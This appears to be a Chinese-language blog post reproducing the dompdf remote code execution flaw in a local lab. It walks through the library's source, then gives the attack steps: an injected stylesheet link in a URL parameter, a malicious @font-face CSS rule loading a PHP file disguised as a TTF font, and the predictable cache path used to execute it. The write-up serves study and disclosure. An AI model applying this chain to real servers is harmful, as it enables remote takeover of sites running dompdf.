---
title: dompdf 0day(RCE)复现
date: 2022-03-19
tags: 漏洞复现
categories: Technology
---



这次的漏洞是`dompdf`这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。

最开始这个漏洞并不是rce，而是xss。

首先是两个配置：

在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。

```php
/**
* Enable embedded PHP
*
* If this setting is set to true then DOMPDF will automatically evaluate
* embedded PHP contained within  ...  tags.
*
* ==== IMPORTANT ====
* Enabling this for documents you do not trust (e.g. arbitrary remote html
* pages) is a security risk. Embedded scripts are run with the same level of
* system access available to dompdf. Set this option to false (recommended)
* if you wish to process untrusted documents.
*
* This setting may increase the risk of system exploit. Do not change
* this settings without understanding the consequences. Additional
* documentation is available on the dompdf wiki at:
*
*
* @var bool
*/
private $isPhpEnabled = false;
```

远程资源加载：

```php
/**
* Enable remote file access
*
* If this setting is set to true, DOMPDF will access remote sites for
* images and CSS files as required.
*
* ==== IMPORTANT ====
* This can be a security risk, in particular in combination with isPhpEnabled and
* allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf->load_html(...);
* This allows anonymous users to download legally doubtful internet content which on
* tracing back appears to being downloaded by your server, or allows malicious php code
* in remote html pages to be executed by your server with your account privileges.
*
* This setting may increase the risk of system exploit. Do not change
* this settings without understanding the consequences. Additional
* documentation is available on the dompdf wiki at:
*
*
* @var bool
*/
private $isRemoteEnabled = false;
```

查看这个是否开启可以xss构造：`?t=aa<link rel=stylesheet href="xxxxxxx/test.css">&pdf`，来包含一个外部css，判断这个选项是否开启。

若开启，dompdf即允许通过font-face 的css来加载自定义的字体。

```css
@font-face {
    font-family:'exploitfont';
    src:url('http://localhost:9001/xxxx.ttf');
    font-weight:'normal';
    font-style:'normal';
  }
```

使用外部字体的时候，dompdf将其存在`/lib/fonts`的目录中，并在`dompdf_font_family_cache.php`using中添加相应的条目`saveFontFamilies()`，这个函数将 dompdf 已知的字体编码为 PHP 数组，以及稍后查找它们所需的信息。：

```php
    /**
     * Saves the stored font family cache
     *
     * The name and location of the cache file are determined by {@link
     * FontMetrics::CACHE_FILE}. This file should be writable by the
     * webserver process.
     *
     * @see FontMetrics::loadFontFamilies()
     */
    public function saveFontFamilies()
    {
        // replace the path to the DOMPDF font directories with the corresponding constants (allows for more portability)
        $cacheData = sprintf("<?php return function (%s, %s) {%s", '$fontDir', '$rootDir', PHP_EOL);
        $cacheData .= sprintf("return array (%s", PHP_EOL);
        foreach ($this->fontLookup as $family => $variants) {
            $cacheData .= sprintf("  '%s' => array(%s", addslashes($family), PHP_EOL);
            foreach ($variants as $variant => $path) {
                $path = sprintf("'%s'", $path);
                $path = str_replace('\'' . $this->options->getFontDir(), '$fontDir . \'', $path);
                $path = str_replace('\'' . $this->options->getRootDir(), '$rootDir . \'', $path);
                $cacheData .= sprintf("    '%s' => %s,%s", $variant, $path, PHP_EOL);
            }
            $cacheData .= sprintf("  ),%s", PHP_EOL);
        }
        $cacheData .= ");" . PHP_EOL;
        $cacheData .= "}; ?>";
        file_put_contents($this->getCacheFile(), $cacheData);
    }
```

如果不能使用字体缓存索引，直接使用字体缓存是否可行？看下dompdf如何如何注册新字体(部分，具体在[这里](https://github.com/dompdf/dompdf/blob/v1.2.0/src/FontMetrics.php#L174))：

```php
/**
* @param array $style
* @param string $remoteFile
* @param resource $context
* @return bool
*/
public function registerFont($style, $remoteFile, $context = null)
{
   $fontname = mb_strtolower($style["family"]);
   $styleString = $this->getType("{$style['weight']} {$style['style']}");

   $fontDir = $this->options->getFontDir();
   $remoteHash = md5($remoteFile);

   $prefix = $fontname . "_" . $styleString;
   $prefix = preg_replace("[\\W]", "_", $prefix);
   $prefix = preg_replace("/[^-_\\w]+/", "", $prefix);

   $localFile = $fontDir . "/" . $prefix . "_" . $remoteHash;
   $localFile .= ".".strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));

   // Download the remote file
   list($remoteFileContent, $http_response_header) = @Helpers::getFileContent($remoteFile, $context);

   $localTempFile = @tempnam($this->options->get("tempDir"), "dompdf-font-");
   file_put_contents($localTempFile, $remoteFileContent);

   $font = Font::load($localTempFile);

   if (!$font) {
       unlink($localTempFile);
       return false;
   }

   $font->parse();
   $font->close();

   unlink($localTempFile);

   // Save the changes
   file_put_contents($localFile, $remoteFileContent);
   $this->saveFontFamilies();

   return true;
}
```

可以看到，新缓存字体的名字是确定了的，`字体名称`，`样式`，`MD5(RemoteURL)`这三个组成，比如，url是这样:`http://attacker.local/test_font.ttf`，样式为normal，那么将被存为：`testfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf`

![image-20220319110855454](dompdf 0day(RCE)复现/image-20220319110855454.png)

那么这样的话，即使没有目录遍历的洞，也可以不用爆破直接知道文件名。

当然，上传的字体必须有效，必须能被加载和解析。

但是源码有个问题，他判断字体文件是否正常，是基于上传文件的文件头，类似Linux的判断方式，而不管文件后缀，那么即使使用其他后缀，只要符合`ttf`的文件头标准，仍可被解析。

下面是构造的`css`以及`ttf(php)`：

```css
@font-face {
    font-family:'exploitfont';
    src:url('http://localhost:9001/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
```

![image-20220319111650926](dompdf/image-20220319111650926.png)



至于ttf文件结构？网上一堆。。。

下面直接使用[github](https://github.com/positive-security/dompdf-rce)的来复现：

开启应用和exp：

![image-20220319111921628](dompdf/image-20220319111921628.png)

使用exploit_font.php触发：

```
http://localhost:9000/index.php?pdf&title=<link rel=stylesheet href='http://localhost:9001/exploit.css'>
```

之后访问：`http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php`

![image-20220319112233859](dompdf/image-20220319112233859.png)

成功触发。

u1s1这个洞完全可以出个CTF题，，

参考链接：

>   https://positive.security/blog/dompdf-rce
>
>   https://github.com/positive-security/dompdf-rce
>
>   [ttf文件格式](https://juejin.cn/post/7010064099027451912)